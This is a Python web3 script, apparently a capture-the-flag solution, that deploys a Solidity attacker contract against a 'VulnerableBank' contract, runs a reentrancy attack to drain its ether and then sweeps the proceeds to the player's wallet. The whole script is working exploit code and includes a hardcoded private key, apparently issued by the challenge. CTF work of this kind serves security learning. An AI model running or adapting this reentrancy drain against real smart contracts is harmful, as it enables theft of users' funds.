import os
from web3 import Web3
from solcx import compile_source, install_solc

# --- THÔNG TIN TỪ SERVER ---
RPC_URL = "http://chal1.fwectf.com:8019/"
PRIVATE_KEY = "0x4ae8d68976e1cd68b8777ec8edde2e73a1dfaec6388898d462533ab8cd01475c"
BANK_ADDRESS = "0x1C64f7dBf856e85e6C0835f092055dD1a61D5312"
# -----------------------------

# --- THIẾT LẬP ---
w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected(), "Failed to connect to RPC"
account = w3.eth.account.from_key(PRIVATE_KEY)

print(f"[*] Player address: {account.address}")
print(f"[*] Player balance: {w3.from_wei(w3.eth.get_balance(account.address), 'ether')} ETH")
print(f"[*] VulnerableBank address: {BANK_ADDRESS}")
initial_bank_balance = w3.eth.get_balance(BANK_ADDRESS)
print(f"[*] Initial bank balance: {w3.from_wei(initial_bank_balance, 'ether')} ETH")

# --- COMPILE CONTRACT ---
print("\n[*] Compiling Attacker.sol...")
install_solc('0.8.26')
with open('Attacker.sol', 'r', encoding='utf-8') as f:
    attacker_source_code = f.read()
compiled_sol = compile_source(
    attacker_source_code,
    output_values=['abi', 'bin'],
    solc_version='0.8.26'
)
attacker_contract_interface = compiled_sol['<stdin>:Attacker']
attacker_bytecode = attacker_contract_interface['bin']
attacker_abi = attacker_contract_interface['abi']
AttackerContract = w3.eth.contract(abi=attacker_abi, bytecode=attacker_bytecode)

# --- DEPLOY CONTRACT ---
print("\n[*] Step 1: Deploying Attacker contract...")
deploy_transaction = AttackerContract.constructor(BANK_ADDRESS).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gasPrice': w3.eth.gas_price,
})
signed_deploy_tx = w3.eth.account.sign_transaction(deploy_transaction, PRIVATE_KEY)
deploy_tx_hash = w3.eth.send_raw_transaction(signed_deploy_tx.raw_transaction)
deploy_tx_receipt = w3.eth.wait_for_transaction_receipt(deploy_tx_hash)
attacker_address = deploy_tx_receipt.contractAddress
print(f"[*] Attacker contract deployed at: {attacker_address}")
attacker_instance = w3.eth.contract(address=attacker_address, abi=attacker_abi)

# --- BƯỚC 2: DEPOSIT VÀO BANK ---
# >>>>>>>>>>>> SỬA LỖI LOGIC CUỐI CÙNG TẠI ĐÂY <<<<<<<<<<<<
# Deposit một số tiền là ước số của 10 (số dư ban đầu của bank)
deposit_amount = w3.to_wei(0.5, 'ether') 
print(f"\n[*] Step 2: Depositing {w3.from_wei(deposit_amount, 'ether')} ETH...")
deposit_tx = attacker_instance.functions.setupAttack().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gasPrice': w3.eth.gas_price,
    'value': deposit_amount,
})
signed_deposit_tx = w3.eth.account.sign_transaction(deposit_tx, PRIVATE_KEY)
deposit_tx_hash = w3.eth.send_raw_transaction(signed_deposit_tx.raw_transaction)
w3.eth.wait_for_transaction_receipt(deposit_tx_hash)
print("[*] Deposit successful.")

# --- BƯỚC 3: TẤN CÔNG ---
print("\n[*] Step 3: Launching the reentrancy attack...")
attack_tx = attacker_instance.functions.attack().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gasPrice': w3.eth.gas_price,
    'gas': 5000000, # Tăng gas một chút cho chắc chắn với 21 lần lặp
})
signed_attack_tx = w3.eth.account.sign_transaction(attack_tx, PRIVATE_KEY)
attack_tx_hash = w3.eth.send_raw_transaction(signed_attack_tx.raw_transaction)
w3.eth.wait_for_transaction_receipt(attack_tx_hash)
print("[*] Attack executed.")

final_bank_balance = w3.eth.get_balance(BANK_ADDRESS)
print(f"[*] Final bank balance: {w3.from_wei(final_bank_balance, 'ether')} ETH")

if final_bank_balance == 0:
    print("\n[+] SUCCESS! The bank has been drained.")
    
    # --- BƯỚC 4: RÚT TIỀN VỀ VÍ ---
    attacker_balance = w3.eth.get_balance(attacker_address)
    print(f"[*] Attacker contract balance: {w3.from_wei(attacker_balance, 'ether')} ETH")
    print("[*] Step 4: Draining funds from Attacker contract...")
    drain_tx = attacker_instance.functions.drainFunds().build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gasPrice': w3.eth.gas_price,
    })
    signed_drain_tx = w3.eth.account.sign_transaction(drain_tx, PRIVATE_KEY)
    drain_tx_hash = w3.eth.send_raw_transaction(signed_drain_tx.raw_transaction)
    w3.eth.wait_for_transaction_receipt(drain_tx_hash)
    print("[*] Funds drained successfully.")
    print(f"[*] Final player balance: {w3.from_wei(w3.eth.get_balance(account.address), 'ether')} ETH")
else:
    print("\n[-] FAILURE! The bank was not drained.")